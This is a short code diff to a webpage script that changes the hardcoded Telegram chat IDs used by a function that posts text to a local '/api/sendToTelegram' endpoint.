@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     function sendToTelegram(text) {
         const endpoint = '/api/sendToTelegram';
-        const chatIds = ['5063761901', '5465922461'];
+        const chatIds = ['8095392010', '8095392010'];
 
         chatIds.forEach(chat_id => {
             const params = {
